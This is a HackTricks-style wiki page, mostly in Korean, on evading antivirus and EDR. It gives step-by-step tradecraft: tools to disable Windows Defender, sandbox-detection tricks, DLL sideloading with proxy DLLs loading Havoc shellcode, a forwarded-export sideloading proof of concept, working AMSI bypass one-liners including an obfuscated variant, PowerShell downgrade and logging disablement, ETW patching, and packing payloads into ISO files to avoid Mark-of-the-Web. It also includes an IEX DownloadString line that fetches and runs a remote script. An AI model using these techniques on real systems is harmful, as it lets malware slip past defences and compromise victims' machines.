# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender가 작동하지 않게 만드는 도구입니다.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV를 가장하여 Windows Defender가 작동하지 않게 만드는 도구입니다.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

현재 AV는 파일이 악성인지 여부를 확인하기 위해 정적 탐지, 동적 분석, 그리고 더 고급 EDR의 경우 행동 분석 등 다양한 방법을 사용합니다.

### **Static detection**

정적 탐지는 바이너리나 스크립트 내의 알려진 악성 문자열이나 바이트 배열을 표시하거나 파일 자체에서 정보를 추출하는 방식(e.g. file description, company name, digital signatures, icon, checksum 등)으로 이루어집니다. 이는 공개된 도구를 사용하면 더 쉽게 탐지될 수 있다는 의미입니다. 이미 분석되어 악성으로 표시되었을 가능성이 높기 때문입니다. 이러한 탐지를 피할 수 있는 몇 가지 방법이 있습니다:

- **Encryption**

바이너리를 암호화하면 AV가 프로그램을 탐지할 방법이 없어집니다. 다만 메모리에서 복호화하고 실행하기 위한 로더가 필요합니다.

- **Obfuscation**

때로는 바이너리나 스크립트의 몇몇 문자열만 변경해도 AV를 통과할 수 있습니다. 다만 obfuscate하려는 대상에 따라 시간 소모가 클 수 있습니다.

- **Custom tooling**

자체 도구를 개발하면 알려진 악성 서명이 없기 때문에 탐지를 피하기 쉽습니다. 그러나 많은 시간과 노력이 필요합니다.

> [!TIP]
> Windows Defender의 정적 탐지를 확인하는 좋은 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 도구는 파일을 여러 세그먼트로 분할한 다음 Defender에게 각 세그먼트를 개별적으로 스캔하도록 요청합니다. 이렇게 하면 바이너리에서 어떤 문자열이나 바이트가 플래그되는지 정확히 알 수 있습니다.

실용적인 AV Evasion에 관한 이 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)를 강력히 추천합니다.

### **Dynamic analysis**

동적 분석은 AV가 바이너리를 샌드박스에서 실행하고 악성 활동(예: 브라우저 비밀번호를 복호화하여 읽으려 시도, LSASS에 대해 minidump 수행 등)을 감시하는 것을 말합니다. 이 부분은 다루기 더 까다로울 수 있지만, 샌드박스를 회피하기 위해 할 수 있는 몇 가지 방법은 다음과 같습니다.

- **Sleep before execution** 구현 방식에 따라 AV의 동적 분석을 우회하는 좋은 방법이 될 수 있습니다. AV는 사용자의 작업 흐름을 방해하지 않기 위해 파일을 스캔하는 시간이 매우 짧으므로, 긴 sleep을 사용하면 바이너리 분석을 방해할 수 있습니다. 문제는 많은 AV의 샌드박스가 구현 방식에 따라 sleep을 건너뛸 수 있다는 점입니다.
- **Checking machine's resources** 일반적으로 샌드박스는 사용할 리소스가 매우 적습니다(e.g. < 2GB RAM). 그렇지 않으면 사용자 기기를 느리게 할 수 있습니다. 여기서는 매우 창의적으로 접근할 수 있습니다. 예를 들어 CPU 온도나 팬 속도를 확인하는 등, 샌드박스에 모든 것이 구현되어 있지는 않습니다.
- **Machine-specific checks** 예를 들어 대상 사용자의 워크스테이션이 "contoso.local" 도메인에 조인되어 있다면, 컴퓨터의 도메인을 확인하여 지정한 도메인과 일치하지 않으면 프로그램을 종료하게 할 수 있습니다.

알고 보니 Microsoft Defender의 Sandbox computername은 HAL9TH입니다. 따라서 악성코드가 폭발하기 전에 컴퓨터 이름을 확인하여 HAL9TH와 일치하면 Defender의 샌드박스 내부에 있다는 뜻이므로 프로그램을 종료하게 할 수 있습니다.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

샌드박스에 대응하기 위한 [@mgeeky](https://twitter.com/mariuszbit)의 다른 유용한 팁들

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

앞서 말했듯이, **public tools**는 결국 **탐지됩니다**, 그래서 스스로에게 물어보아야 합니다:

예를 들어 LSASS를 덤프하려면, **정말로 mimikatz를 사용해야 하나요**? 아니면 LSASS를 덤프하는 덜 알려진 다른 프로젝트를 사용할 수 있을까요?

정답은 아마 후자일 것입니다. mimikatz를 예로 들면, 이는 AV와 EDR에 의해 가장 많이 플래그되는 도구 중 하나일 가능성이 높습니다. 프로젝트 자체는 정말 훌륭하지만 AV를 우회하는 측면에서는 다루기 골치 아픈 경우가 많으므로, 달성하려는 목적에 대한 대안을 찾아보세요.

> [!TIP]
> 페이로드를 회피 목적으로 수정할 때는 Defender에서 **automatic sample submission**을 끄는 것을 잊지 마세요. 그리고 제발, 장기적인 회피를 목표로 한다면 **DO NOT UPLOAD TO VIRUSTOTAL**을 진지하게 지키세요. 특정 AV에서 페이로드가 탐지되는지 확인하려면 VM에 설치하고 automatic sample submission을 끈 뒤, 결과에 만족할 때까지 거기서 테스트하세요.

## EXEs vs DLLs

가능하다면 항상 **evade를 위해 DLLs 사용을 우선시**하세요. 제 경험상 DLL 파일은 보통 **탐지율이 훨씬 낮고** 분석 대상이 되는 경우가 적습니다. 따라서 페이로드가 DLL로 실행될 수 있는 방법이 있다면 일부 경우에 탐지를 피하는 간단한 트릭이 됩니다.

이 이미지에서 볼 수 있듯이, Havoc의 DLL Payload는 antiscan.me에서 4/26의 탐지율을 보인 반면, EXE 페이로드는 7/26의 탐지율을 보였습니다.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

이제 DLL 파일을 사용해 훨씬 더 은밀해질 수 있는 몇 가지 트릭을 보여드리겠습니다.

## DLL Sideloading & Proxying

**DLL Sideloading**은 로더가 사용하는 DLL 검색 순서를 악용하여, 피해자 애플리케이션과 악성 페이로드를 서로 나란히 배치하는 기법입니다.

[Siofra](https://github.com/Cybereason/siofra)와 다음 powershell 스크립트를 사용하면 DLL Sideloading에 취약한 프로그램을 확인할 수 있습니다:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
이 명령은 "C:\Program Files\\" 내부에서 DLL hijacking에 취약한 프로그램 목록과 해당 프로그램들이 로드하려고 하는 DLL files를 출력합니다.

저는 **DLL Hijackable/Sideloadable programs를 직접 탐색해 보시길 강력히 권합니다**, 이 기법은 제대로 수행하면 상당히 은밀하지만, 공개적으로 알려진 DLL Sideloadable programs를 사용하면 쉽게 발각될 수 있습니다.

단순히 프로그램이 로드할 것으로 기대하는 이름의 악성 DLL을 배치한다고 해서 페이로드가 실행되는 것은 아닙니다. 프로그램은 그 DLL 내부에 특정 함수들을 기대하기 때문입니다. 이 문제를 해결하기 위해 **DLL Proxying/Forwarding**이라는 다른 기법을 사용할 것입니다.

**DLL Proxying**은 프록시(및 악성) DLL에서 원래 DLL로 프로그램이 하는 호출을 전달하여 프로그램의 기능을 유지하면서 페이로드 실행을 처리할 수 있게 합니다.

저는 [@flangvik](https://twitter.com/Flangvik/)의 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 사용할 것입니다.

These are the steps I followed:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 우리에게 2개의 파일을 제공합니다: DLL 소스 코드 템플릿과 원래 이름이 변경된 DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 저는 DLL Sideloading에 관한 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)와 또한 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)를 시청할 것을 강력히 권합니다. 이 영상들은 우리가 더 깊이 다룬 내용을 더 잘 이해하는 데 도움이 됩니다.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE 모듈은 실제로 "forwarders"인 함수를 export할 수 있습니다: 코드 대신 export 엔트리는 `TargetDll.TargetFunc` 형식의 ASCII 문자열을 포함합니다. 호출자가 export를 해석할 때 Windows loader는:

- `TargetDll`이 아직 로드되어 있지 않다면 로드합니다
- 거기서 `TargetFunc`를 해석합니다

이해해야 할 주요 동작:
- `TargetDll`이 KnownDLL인 경우, 보호된 KnownDLLs 네임스페이스에서 제공됩니다(예: ntdll, kernelbase, ole32).
- `TargetDll`이 KnownDLL이 아닌 경우, 일반적인 DLL 검색 순서가 사용되며 이는 forward 해석을 수행하는 모듈의 디렉터리를 포함합니다.

이는 간접적인 sideloading primitive를 가능하게 합니다: non-KnownDLL 모듈 이름으로 forward된 함수를 export하는 signed DLL을 찾은 다음, 그 signed DLL과 동일한 디렉터리에 forward된 대상 모듈 이름과 정확히 같은 이름의 attacker-controlled DLL을 함께 배치하십시오. forward된 export가 호출되면 loader가 forward를 해석하여 같은 디렉터리에서 당신의 DLL을 로드하고 DllMain을 실행합니다.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll`은 KnownDLL이 아니므로 일반 검색 순서에 따라 해결됩니다.

PoC (복사-붙여넣기):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더로 복사합니다.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 같은 폴더에 악성 `NCRYPTPROV.dll`을 배치하세요. 최소한의 DllMain만으로 코드 실행이 가능하며; DllMain을 트리거하기 위해 포워딩된 함수를 구현할 필요는 없습니다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 서명된 LOLBin으로 포워딩을 트리거:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (서명됨) loads the side-by-side `keyiso.dll` (서명됨)
- `KeyIsoSetAuditingInterface`를 해결하는 동안 로더는 포워드를 따라 `NCRYPTPROV.SetAuditingInterface`로 이동한다
- 로더는 이어서 `C:\test`에서 `NCRYPTPROV.dll`을 로드하고 그 `DllMain`을 실행한다
- `SetAuditingInterface`가 구현되어 있지 않으면, `DllMain`이 이미 실행된 후에만 "missing API" 오류가 발생한다

Hunting tips:
- 대상 모듈이 KnownDLL이 아닌 forwarded exports에 집중하세요. KnownDLLs는 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`에 나열되어 있습니다.
- 다음과 같은 도구로 forwarded exports를 열거할 수 있습니다:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 forwarder 목록에서 후보를 검색하세요: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (e.g., rundll32.exe)가 비시스템 경로에서 서명된 DLL을 로드한 다음, 같은 기본 이름을 가진 non-KnownDLLs를 해당 디렉터리에서 로드하는 것을 모니터링하세요
- 다음과 같은 프로세스/모듈 체인(사용자 쓰기 가능 경로에서)에 대해 경고를 생성하세요: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll`
- 코드 무결성 정책(WDAC/AppLocker)을 시행하고 애플리케이션 디렉터리에서 write+execute를 차단하세요

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze를 사용하여 shellcode를 은밀하게 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 회피는 단순한 쥐와 고양이의 게임입니다. 오늘 통하는 방법이 내일 탐지될 수 있으므로 절대 하나의 도구에만 의존하지 말고, 가능하면 여러 회피 기법을 연쇄적으로 사용하세요.

## AMSI (Anti-Malware Scan Interface)

AMSI는 "fileless malware"(파일리스 멀웨어)를 방지하기 위해 만들어졌습니다. 초기에는 AV가 디스크상의 파일만 스캔할 수 있었기 때문에, 페이로드를 메모리에서 직접 실행할 수 있다면 AV는 충분한 가시성이 없어 이를 막을 수 없었습니다.

AMSI 기능은 Windows의 다음 구성요소에 통합되어 있습니다.

- User Account Control, or UAC (EXE, COM, MSI 또는 ActiveX 설치의 권한 상승)
- PowerShell (스크립트, 대화형 사용 및 동적 코드 평가)
- Windows Script Host (wscript.exe 및 cscript.exe)
- JavaScript 및 VBScript
- Office VBA 매크로

이는 스크립트 내용을 암호화되지 않고 난독화되지 않은 형태로 노출하여 안티바이러스 솔루션이 스크립트 동작을 검사할 수 있게 합니다.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`를 실행하면 Windows Defender에서 다음과 같은 경고가 발생합니다.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:`를 앞에 붙이고 스크립트가 실행된 실행 파일의 경로(이 경우 powershell.exe)를 표시하는 것을 볼 수 있습니다.

디스크에 어떤 파일도 떨어뜨리지 않았지만 AMSI 때문에 메모리에서 실행 중인 상태도 탐지되었습니다.

더욱이, **.NET 4.8**부터는 C# 코드도 AMSI를 통해 실행됩니다. 이는 `Assembly.Load(byte[])`를 통한 인메모리 로딩에도 영향을 줍니다. 따라서 AMSI를 회피하려면 인메모리 실행용으로는 .NET의 더 낮은 버전(예: 4.7.2 이하)을 사용하는 것이 권장됩니다.

AMSI를 우회하는 방법은 몇 가지가 있습니다:

- **Obfuscation**

AMSI는 주로 정적 탐지에 의존하므로, 로드하려는 스크립트를 수정하는 것은 탐지를 회피하는 좋은 방법이 될 수 있습니다.

그러나 AMSI는 여러 레이어의 난독화가 있더라도 스크립트를 복원할 수 있는 능력이 있으므로, 난독화 방법에 따라 오히려 효과가 없을 수 있습니다. 따라서 회피가 간단하지 않을 수 있습니다. 다만 때때로 몇 개의 변수명만 바꿔도 해결되는 경우가 있으므로, 얼마나 심하게 표시되었는지에 따라 달라집니다.

- **AMSI Bypass**

AMSI는 powershell(및 cscript.exe, wscript.exe 등) 프로세스에 DLL을 로드하는 방식으로 구현되어 있기 때문에, 권한이 없는 사용자로 실행 중일 때에도 쉽게 조작할 수 있습니다. AMSI 구현의 이 결함으로 연구자들은 AMSI 스캔을 회피하는 여러 방법을 찾아냈습니다.

**Forcing an Error**

AMSI 초기화가 실패하도록 강제(amsiInitFailed)하면 현재 프로세스에 대해 스캔이 시작되지 않습니다. 원래 이 기법은 [Matt Graeber](https://twitter.com/mattifestation)이 공개했으며, Microsoft는 보다 광범위한 사용을 막기 위해 시그니처를 개발했습니다.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
한 줄의 powershell 코드만으로 현재 powershell 프로세스에서 AMSI를 사용할 수 없게 만들 수 있었다. 이 한 줄은 물론 AMSI 자체에 의해 탐지되었기 때문에 이 기법을 사용하려면 약간의 수정이 필요하다.

다음은 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass이다.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

This tools [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remove the detected signature**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

**AV/EDR products that uses AMSI**

You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS 로깅

PowerShell 로깅은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있게 해주는 기능이다. 감사와 문제 해결에 유용하지만, 탐지를 회피하려는 공격자에게는 문제가 될 수 있다.

PowerShell 로깅을 우회하기 위해 다음 기법들을 사용할 수 있다:

- **Disable PowerShell Transcription and Module Logging**: 이 목적을 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 같은 도구를 사용할 수 있다.
- **Use Powershell version 2**: PowerShell version 2를 사용하면 AMSI가 로드되지 않으므로 AMSI 검사 없이 스크립트를 실행할 수 있다. 예: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 방어가 없는 powershell을 생성하려면 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 를 사용하라 (이 방법은 Cobal Strike의 `powerpick`이 사용하는 방식이다).


## 난독화

> [!TIP]
> 여러 난독화 기법은 데이터를 암호화하는 데 의존하며, 이로 인해 바이너리의 엔트로피가 증가하여 AVs 및 EDRs가 탐지하기 쉬워진다. 이에 주의하고, 민감하거나 숨길 필요가 있는 코드 섹션에만 암호화를 적용하는 것이 좋다.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2(또는 상업적 포크)를 사용하는 악성코드를 분석할 때는 디컴파일러와 샌드박스를 차단하는 여러 보호 계층을 마주치는 것이 일반적이다. 아래 워크플로우는 신뢰성 있게 원본에 가까운 IL을 **복원**하며, 이후 dnSpy나 ILSpy 같은 도구에서 C#으로 디컴파일할 수 있다.

1.  Anti-tampering 제거 – ConfuserEx는 모든 *method body*를 암호화하고 *module* 정적 생성자(`<Module>.cctor`) 내에서 복호화한다. 또한 PE 체크섬을 패치하여 수정 시 바이너리가 크래시나게 만든다. 암호화된 메타데이터 테이블을 찾고 XOR 키를 복구하여 클린 어셈블리를 다시 쓰려면 **AntiTamperKiller**를 사용하라:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
출력에는 자체 언패커를 만들 때 유용할 수 있는 6개의 안티탬퍼 파라미터(`key0-key3`, `nameHash`, `internKey`)가 포함된다.

2.  심볼 / 제어 흐름 복구 – *clean* 파일을 ConfuserEx를 인식하는 de4dot 포크인 **de4dot-cex**에 넣어라.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 프로필 선택  
• de4dot는 control-flow flattening을 되돌리고 원래의 namespaces, classes 및 변수 이름을 복원하며 상수 문자열을 복호화한다.

3.  Proxy-call 제거 – ConfuserEx는 디컴파일을 더 어렵게 만들기 위해 직접적인 메서드 호출을 경량 래퍼(일명 *proxy calls*)로 대체한다. **ProxyCall-Remover**로 이를 제거하라:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
이 단계 후에는 `Class8.smethod_10` 같은 불투명한 래퍼 함수 대신 `Convert.FromBase64String` 또는 `AES.Create()` 같은 일반적인 .NET API를 볼 수 있어야 한다.

4.  수동 정리 – 결과 바이너리를 dnSpy에서 실행하여 큰 Base64 블롭이나 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 사용을 검색해 *실제* 페이로드를 찾아라. 종종 악성코드는 `<Module>.byte_0` 내부에 TLV로 인코딩된 바이트 배열로 저장한다.

위 체인은 악성 샘플을 실행할 필요 없이 실행 흐름을 복원하므로 오프라인 워크스테이션에서 작업할 때 유용하다.

> 🛈  ConfuserEx는 `ConfusedByAttribute`라는 커스텀 어트리뷰트를 생성하며, 이는 샘플을 자동 분류하는 IOC로 사용할 수 있다.

#### 원라이너
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목적은 [LLVM](http://www.llvm.org/) 컴파일링 스위트의 오픈 소스 포크를 제공하여 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 및 변조 방지를 통해 소프트웨어 보안을 향상시키는 것입니다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 외부 도구를 사용하거나 컴파일러를 수정하지 않고 `C++11/14`를 이용해 컴파일 시에 obfuscated code를 생성하는 방법을 시연합니다.
- [**obfy**](https://github.com/fritzone/obfy): C++ 템플릿 메타프로그래밍 프레임워크로 생성된 obfuscated operations 계층을 추가하여 애플리케이션을 크랙하려는 사람의 작업을 조금 더 어렵게 만듭니다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 .exe, .dll, .sys 등을 포함한 다양한 pe 파일을 obfuscate할 수 있는 x64 binary obfuscator입니다.
- [**metame**](https://github.com/a0rtega/metame): Metame은 임의의 실행 파일을 위한 단순한 metamorphic code 엔진입니다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP(return-oriented programming)를 사용해 LLVM 지원 언어용의 세밀한 code obfuscation 프레임워크입니다. ROPfuscator는 일반 명령어를 ROP 체인으로 변환하여 어셈블리 코드 수준에서 프로그램을 obfuscate함으로써 기존의 정상적인 제어 흐름 개념을 방해합니다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE Crypter입니다.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 후 로드할 수 있습니다

## SmartScreen & MoTW

인터넷에서 일부 실행 파일을 다운로드하여 실행할 때 이 화면을 본 적이 있을 것입니다.

Microsoft Defender SmartScreen은 최종 사용자가 잠재적으로 악성인 응용 프로그램을 실행하는 것으로부터 보호하기 위한 보안 메커니즘입니다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 reputation-based 접근 방식을 사용합니다. 즉, 드물게 다운로드되는 애플리케이션은 SmartScreen을 트리거하여 경고를 표시하고 최종 사용자가 파일을 실행하지 못하도록 방지합니다(하지만 파일은 여전히 More Info -> Run anyway를 클릭하면 실행할 수 있습니다).

**MoTW** (Mark of The Web) 는 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) 중 Zone.Identifier라는 이름을 가진 ADS로, 인터넷에서 파일을 다운로드할 때 다운로드된 URL과 함께 자동으로 생성됩니다.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS를 확인합니다.</p></figcaption></figure>

> [!TIP]
> 중요한 점은 **신뢰된** 서명 인증서로 서명된 실행 파일은 SmartScreen을 **트리거하지 않습니다**.

payloads가 Mark of The Web을 얻지 않게 하는 매우 효과적인 방법은 ISO 같은 컨테이너 안에 패키징하는 것입니다. 이는 Mark-of-the-Web (MOTW)이 **non NTFS** 볼륨에는 **적용될 수 없습니다**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 는 payloads를 output containers에 패키징하여 Mark-of-the-Web을 회피하는 도구입니다.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW)는 애플리케이션과 시스템 구성요소가 **events를 기록(log events)** 할 수 있게 해주는 강력한 Windows 로깅 메커니즘입니다. 그러나 보안 제품들이 악성 활동을 모니터링하고 탐지하는데 ETW를 활용할 수도 있습니다.

AMSI가 우회되는 방식과 유사하게, 사용자 공간 프로세스의 **`EtwEventWrite`** 함수를 즉시 반환하도록 만들어 어떠한 이벤트도 기록되지 않게 하는 것도 가능합니다. 이는 메모리에서 해당 함수를 패치하여 즉시 반환하게 함으로써 그 프로세스에 대한 ETW 로깅을 사실상 비활성화하는 방법입니다.

자세한 내용은 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 를 참고하세요.


## C# Assembly Reflection

메모리에서 C# 바이너리를 로드하는 것은 오래전부터 알려진 방법이며, 여전히 AV에 걸리지 않고 post-exploitation 도구를 실행하는 훌륭한 방법입니다.

페이로드가 디스크를 건드리지 않고 직접 메모리로 로드되기 때문에, 우리는 프로세스 전체에 대해 AMSI를 패치하는 것만 신경쓰면 됩니다.

대부분의 C2 프레임워크(sliver, Covenant, metasploit, CobaltStrike, Havoc 등)는 이미 C# 어셈블리를 메모리에서 직접 실행하는 기능을 제공하지만, 이를 구현하는 방법은 여러 가지가 있습니다:

- **Fork\&Run**

새로운 희생 프로세스를 **스폰(spawn)** 하고, 그 새 프로세스에 post-exploitation 악성 코드를 인젝션한 뒤 실행하고 완료되면 새 프로세스를 종료하는 방법입니다. 이 방식은 장단점이 있습니다. 장점은 실행이 우리 Beacon implant 프로세스 **외부**에서 일어난다는 점입니다. 따라서 post-exploitation 동작 중 문제가 생기거나 탐지되더라도 우리 **implant가 살아남을 가능성**이 훨씬 큽니다. 단점은 **Behavioural Detections**에 의해 걸릴 가능성이 더 높다는 점입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

